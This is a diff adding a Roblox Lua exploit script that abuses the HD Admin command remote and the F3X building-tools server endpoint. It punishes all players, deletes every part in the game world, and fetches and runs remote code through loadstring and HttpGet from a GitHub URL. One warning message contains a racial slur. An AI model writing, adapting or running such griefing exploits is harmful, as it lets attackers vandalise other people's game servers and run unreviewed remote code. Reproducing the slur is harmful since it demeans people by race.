@@ -1,0 +1,53 @@
+-- I GIVE CREDIT TO K00PKIDD , I JUST SKIDDED HER REALM
+-- PLSS MAN..
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage
+:WaitForChild("HDAdminHDClient")
+.Signals.RequestCommandSilent
+ 
+RequestCommand:InvokeServer(";btools me")
+RequestCommand:InvokeServer(";time 0 ;undisco ;unmusic ;unfogcolor")
+task.wait(0.3)
+RequestCommand:InvokeServer(";punish all ")
+ 
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local backpack = player:WaitForChild("Backpack")
+ 
+local function getf3x()
+for _,v in ipairs(backpack:GetChildren()) do
+if v:FindFirstChild("SyncAPI") then return v end
+end
+for _,v in ipairs(char:GetChildren()) do
+if v:FindFirstChild("SyncAPI") then return v end
+end
+end
+ 
+local f3x = getf3x()
+if not f3x then warn("stupid nigger no f3x!") return end
+local serverendpoint = f3x.SyncAPI.ServerEndpoint
+ 
+local function remove(p)
+serverendpoint:InvokeServer("Remove",{p})
+end
+ 
+local function deleteall()
+for _,v in ipairs(workspace:GetDescendants()) do
+if v:IsA("BasePart") or v:IsA("UnionOperation") then
+task.spawn(function()
+pcall(function() remove(v) end)
+end)
+end
+end
+end
+ 
+--
+deleteall()
+task.wait(0.6)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zaxh69/Project/refs/heads/main/Musque-realm-but-better"))()
+RequestCommand:InvokeServer(";res all")
+task.wait(0.3)
+RequestCommand:InvokeServer(";time 0")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+RequestCommand:InvokeServer(";music 101420344383185 ;pitch 0.08 ;volume 2 ")
